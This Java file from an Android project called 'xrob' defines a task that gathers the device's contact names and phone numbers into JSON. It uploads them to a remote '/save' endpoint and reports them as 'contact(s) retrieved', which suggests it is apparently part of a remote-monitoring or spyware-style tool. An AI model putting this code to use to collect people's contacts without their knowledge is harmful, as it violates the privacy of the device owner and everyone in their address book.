package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.database.Contacts;
import com.theah64.xrob.database.PhoneNumbers;
import com.theah64.xrob.models.Contact;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 12/9/16.
 */
public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Context, Void, APIResponse> {

    private static final String X = ContactsSynchronizer.class.getSimpleName();

    @Override
    protected APIResponse doInBackground(Context... contexts) {
        push(contexts[0]);
        return null;
    }

    public static void push(Context context) {

        final Contacts contactsTable = Contacts.getInstance(context);
        final List<Contact> unSyncedContacts = contactsTable.getNonSyncedContacts();

        if (unSyncedContacts != null) {

            final JSONArray jaContacts = new JSONArray();

            Log.d(X, unSyncedContacts.size() + " need to be synced!");

            try {

                //Looping through each contact
                for (final Contact contact : unSyncedContacts) {

                    final JSONObject joContact = new JSONObject();
                    joContact.put(Contacts.COLUMN_NAME, contact.getName());
                    joContact.put(Contacts.COLUMN_ANDRIOD_CONTACT_ID, contact.getAndroidContactId());

                    if (contact.getPhoneNumbers() != null) {

                        final JSONArray jaPhoneNumbers = new JSONArray();

                        for (final Contact.PhoneNumber phoneNumber : contact.getPhoneNumbers()) {

                            final JSONObject joPhoneNumber = new JSONObject();

                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_NUMBER, phoneNumber.getPhone());
                            joPhoneNumber.put(PhoneNumbers.COLUMN_PHONE_TYPE, phoneNumber.getPhoneType());

                            jaPhoneNumbers.put(joPhoneNumber);
                        }


                        joContact.put(PhoneNumbers.TABLE_PHONE_NUMBERS, jaPhoneNumbers);
                    }

                    jaContacts.put(joContact);
                }

                //Building request
                final Request contactsRequest = new APIRequestBuilder("/save", true)
                        .addParam(Xrob.KEY_ERROR, "false")
                        .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_CONTACTS)
                        .addParam(Xrob.KEY_MESSAGE, String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length()))
                        .addParam(Xrob.KEY_DATA, jaContacts.toString())
                        .build();


                OkHttpUtils.getInstance().getClient().newCall(contactsRequest).enqueue(new Callback() {
                    @Override
                    public void onFailure(Call call, IOException e) {
                        e.printStackTrace();
                    }

                    @Override
                    public void onResponse(Call call, Response response) throws IOException {
                        try {
                            final APIResponse apiResponse = new APIResponse(OkHttpUtils.logAndGetStringBody(response));
                            //Success all contacts synced
                            contactsTable.setAllContactsAndNumbersSynced();

                        } catch (JSONException | APIResponse.APIException e) {
                            e.printStackTrace();
                        }
                    }
                });

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }


    @Override
    protected void onPostExecute(APIResponse apiResponse) {

    }
}